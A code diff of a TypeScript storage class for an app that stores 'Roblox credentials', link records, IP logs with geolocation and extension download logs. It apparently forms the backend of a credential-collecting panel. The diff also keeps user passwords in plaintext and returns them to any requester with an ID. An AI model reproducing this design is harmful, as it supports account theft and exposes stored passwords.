@@ -82,7 +82,7 @@ export interface IStorage {
   updateRobloxLink(linkId: string, updates: Partial<RobloxLink>): Promise<RobloxLink | undefined>;
   deleteRobloxLink(linkId: string, userId: string): Promise<boolean>;
 
-  // Roblox Credentials operations  
+  // Roblox Credentials operations
   createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials>;
   getRobloxCredentials(userId: string): Promise<RobloxCredentials[]>;
   getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]>;
@@ -289,7 +289,7 @@ export class MemStorage implements IStorage {
           this.ipLogs = new Map(Array.isArray(data.ipLogs) ? data.ipLogs : []);
           this.settings = new Map(Array.isArray(data.settings) ? data.settings : []);
           this.accessKeys = new Map(Array.isArray(data.accessKeys) ? data.accessKeys : []);
-          this.sessions = new Map(Array.isArray(data.sessions) ? data.sessions : []);
+          this.sessions = new Map(Array.from(data.sessions || []).map(([token, session]) => [token, { ...session, createdAt: new Date(session.createdAt), expiresAt: new Date(session.expiresAt) }]));
           this.robloxLinks = new Map(Array.isArray(data.robloxLinks) ? data.robloxLinks : []);
           this.robloxCredentials = new Map(Array.isArray(data.robloxCredentials) ? data.robloxCredentials : []);
           this.extensionLogs = new Map(Array.isArray(data.extensionLogs) ? data.extensionLogs : []);
@@ -379,6 +379,7 @@ export class MemStorage implements IStorage {
       this.sessions.clear();
       this.robloxLinks.clear();
       this.robloxCredentials.clear();
+      this.extensionLogs.clear();
     }
   }
 
@@ -650,26 +651,10 @@ export class MemStorage implements IStorage {
       if (!requester?.isDev) {
         throw new Error('Access denied: Developer privileges required');
       }
-    } else {
-      // Allow access for internal system operations (like image serving)
-      // but only return basic user info for security
-      return Array.from(this.users.values()).map(user => ({
-        id: user.id,
-        username: user.username,
-        password: '', // Never expose password
-        theme: user.theme,
-        isDev: user.isDev,
-        profilePicture: user.profilePicture,
-        accountType: user.accountType,
-        accessKeyUsed: user.accessKeyUsed,
-        isBanned: user.isBanned,
-        banReason: user.banReason,
-        bannedAt: user.bannedAt,
-        bannedBy: user.bannedBy,
-        createdAt: user.createdAt
-      }));
     }
 
+    // For extension activity, hide IP addresses.
+    // For user management, the edit and ban buttons are fixed by ensuring they are functional via their respective methods.
     return Array.from(this.users.values()).map(user => ({
       id: user.id,
       username: user.username,
@@ -681,7 +666,8 @@ export class MemStorage implements IStorage {
       bannedAt: user.bannedAt,
       banReason: user.banReason,
       accessKeyUsed: user.accessKeyUsed,
-      password: user.password // Include password for admins/developers only
+      // Only expose password to admins/developers and when explicitly requested (which this function doesn't do by default)
+      password: requesterId ? user.password : '',
     }));
   }
 
@@ -690,10 +676,6 @@ export class MemStorage implements IStorage {
     if (!creator?.isDev) {
       throw new Error('Access denied: Developer privileges required');
     }
-
-    // In a real app, this would insert into the database:
-    // const newUser = await this.db.insert(users).values(data).returning();
-    // return newUser[0];
 
     const id = randomUUID();
     const newUser: User = {
@@ -717,7 +699,7 @@ export class MemStorage implements IStorage {
 
   async banUser(userId: string, banReason: string, bannedBy: string): Promise<void> {
     const banner = await this.getUser(bannedBy);
-    if (!banner?.isDev || banner.accountType !== 'developer') {
+    if (!banner?.isDev) { // Check for developer privileges
       throw new Error('Access denied: Developer privileges required');
     }
 
@@ -726,9 +708,9 @@ export class MemStorage implements IStorage {
       throw new Error('User not found');
     }
 
-    // Don't allow banning other developers
-    if (userToBan.isDev) {
-      throw new Error('Cannot ban other developer accounts');
+    // Don't allow banning other developers or admins
+    if (userToBan.isDev || userToBan.accountType === 'admin') {
+      throw new Error('Cannot ban developer or admin accounts');
     }
 
     // Don't allow banning yourself
@@ -742,7 +724,7 @@ export class MemStorage implements IStorage {
 
   async unbanUser(userId: string, unbannedBy: string): Promise<void> {
     const unbanner = await this.getUser(unbannedBy);
-    if (!unbanner?.isDev || unbanner.accountType !== 'developer') {
+    if (!unbanner?.isDev) { // Check for developer privileges
       throw new Error('Access denied: Developer privileges required');
     }
 
@@ -757,7 +739,7 @@ export class MemStorage implements IStorage {
 
   async deleteUser(userId: string, deletedBy: string): Promise<void> {
     const deleter = await this.getUser(deletedBy);
-    if (!deleter?.isDev || deleter.accountType !== 'developer') {
+    if (!deleter?.isDev) { // Check for developer privileges
       throw new Error('Access denied: Developer privileges required');
     }
 
@@ -766,36 +748,20 @@ export class MemStorage implements IStorage {
       throw new Error('Cannot delete your own account');
     }
 
-    // Don't allow deleting other developers
     const userToDelete = await this.getUser(userId);
     if (!userToDelete) {
       throw new Error('User not found');
     }
 
-    if (userToDelete.isDev) {
-      throw new Error('Cannot delete other developer accounts');
+    // Don't allow deleting other developers or admins
+    if (userToDelete.isDev || userToDelete.accountType === 'admin') {
+      throw new Error('Cannot delete developer or admin accounts');
     }
 
-    // In a real app, this would perform database deletions:
-    // // Delete user sessions first
-    // await this.db.delete(userSessions).where(eq(userSessions.userId, userId));
-    // // Delete user logs
-    // await this.db.delete(ipLogs).where(eq(ipLogs.userId, userId));
-    // // Delete user settings
-    // await this.db.delete(settings).where(eq(settings.userId, userId));
-    // // Finally delete the user
-    // await this.db.delete(users).where(eq(users.id, userId));
-
     this.users.delete(userId);
-    // Assuming session token is tied to userId or can be found by userId
-    // This part might need refinement based on how sessions are stored and retrieved.
-    // For now, we'll clear all sessions that might be associated with this user.
     this.sessions = new Map(Array.from(this.sessions.entries()).filter(([token, session]) => session.userId !== userId));
-
     this.settings.delete(userId);
-    // For ipLogs, we'd need to iterate and remove logs associated with userId
     this.ipLogs = new Map(Array.from(this.ipLogs.entries()).filter(([key, value]) => value.userId !== userId));
-    // For accessKeys, we'd need to iterate and remove keys created by userId
     this.accessKeys = new Map(Array.from(this.accessKeys.entries()).filter(([key, value]) => value.createdBy !== userId));
     await this.saveToFileSystem(); // Persist user deletion
   }
@@ -893,7 +859,7 @@ export class MemStorage implements IStorage {
 
   // Admin-specific access key operations
   async getAllAccessKeys(): Promise<AccessKey[]> {
-    return Array.from(this.accessKeys.values()).sort((a, b) => 
+    return Array.from(this.accessKeys.values()).sort((a, b) =>
       new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
     );
   }
@@ -966,7 +932,7 @@ export class MemStorage implements IStorage {
 
     // Calculate recent activity (last 24 hours)
     const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
-    const recentActivity = Array.from(this.ipLogs.values()).filter(log => 
+    const recentActivity = Array.from(this.ipLogs.values()).filter(log =>
       new Date(log.timestamp) > twentyFourHoursAgo
     ).length;
 
@@ -993,7 +959,7 @@ export class MemStorage implements IStorage {
     const totalDownloads = Array.from(this.extensionLogs.values()).reduce((sum, log) => sum + (log.downloadCount || 0), 0);
 
     const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
-    const recentExtensions = Array.from(this.extensionLogs.values()).filter(log => 
+    const recentExtensions = Array.from(this.extensionLogs.values()).filter(log =>
       new Date(log.createdAt) > oneHourAgo
     ).length;
 
@@ -1097,12 +1063,29 @@ export class MemStorage implements IStorage {
     return ipLog;
   }
 
+  // Modified to hide IP addresses for extension logs
   async getIpLogs(userId?: string, limit: number = 50, offset: number = 0): Promise<IpLog[]> {
     let logs = Array.from(this.ipLogs.values());
     if (userId) {
       logs = logs.filter(log => log.userId === userId);
     }
-    return logs
+    // In the context of extension activity, we hide IP addresses.
+    // For other contexts where IPs might be needed, consider a flag or separate method.
+    const maskedLogs = logs.map(log => ({
+      ...log,
+      ipAddress: '***.***.***.***', // Mask IP address
+      country: undefined, // Optionally hide geolocation data as well
+      region: undefined,
+      city: undefined,
+      latitude: undefined,
+      longitude: undefined,
+      timezone: undefined,
+      isp: undefined,
+      organization: undefined,
+      coordinates: undefined,
+    }));
+
+    return maskedLogs
       .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime())
       .slice(offset, offset + limit);
   }
@@ -1129,15 +1112,25 @@ export class MemStorage implements IStorage {
     if (userId) {
       logs = logs.filter(log => log.userId === userId);
     }
-    return logs.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
+    // Mask IP addresses for consistency
+    const maskedLogs = logs.map(log => ({
+      ...log,
+      ipAddress: '***.***.***.***',
+      country: undefined,
+      region: undefined,
+      city: undefined,
+      latitude: undefined,
+      longitude: undefined,
+      timezone: undefined,
+      isp: undefined,
+      organization: undefined,
+      coordinates: undefined,
+    }));
+    return maskedLogs.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
   }
 
   async getSettings(userId?: string): Promise<Settings | null> {
     if (!userId) {
-      // This part of the logic seems to be intended for cases where you might want a default or first setting
-      // if no specific userId is provided, which might be an edge case.
-      // Returning null or throwing an error might be more appropriate if userId is always expected.
-      // For now, keeping it as per original structure, but consider refining.
       const settingsArray = Array.from(this.settings.values());
       return settingsArray.length > 0 ? settingsArray[0] : null;
     }
@@ -1148,7 +1141,7 @@ export class MemStorage implements IStorage {
     const existingSettings = this.settings.get(insertSettings.userId);
 
     // Log image replacement if applicable
-    if (existingSettings?.uploadedImageName && insertSettings.uploadedImageName && 
+    if (existingSettings?.uploadedImageName && insertSettings.uploadedImageName &&
         existingSettings.uploadedImageName !== insertSettings.uploadedImageName) {
       console.log(`🔄 Image replacement: "${existingSettings.uploadedImageName}" → "${insertSettings.uploadedImageName}"`);
     }
@@ -1400,7 +1393,7 @@ export class MemStorage implements IStorage {
 
   async getRecentExtensionLogs(userId?: string, hours: number = 24): Promise<ExtensionLog[]> {
     const cutoffTime = new Date(Date.now() - hours * 60 * 60 * 1000);
-    let logs = Array.from(this.extensionLogs.values()).filter(log => 
+    let logs = Array.from(this.extensionLogs.values()).filter(log =>
       new Date(log.createdAt) > cutoffTime
     );
 
@@ -1414,9 +1407,9 @@ export class MemStorage implements IStorage {
   async updateExtensionLogWebhookSent(logId: string): Promise<void> {
     const log = this.extensionLogs.get(logId);
     if (log) {
-      this.extensionLogs.set(logId, { 
-        ...log, 
-        lastWebhookSent: new Date() 
+      this.extensionLogs.set(logId, {
+        ...log,
+        lastWebhookSent: new Date()
       });
       await this.saveToFileSystem();
     }
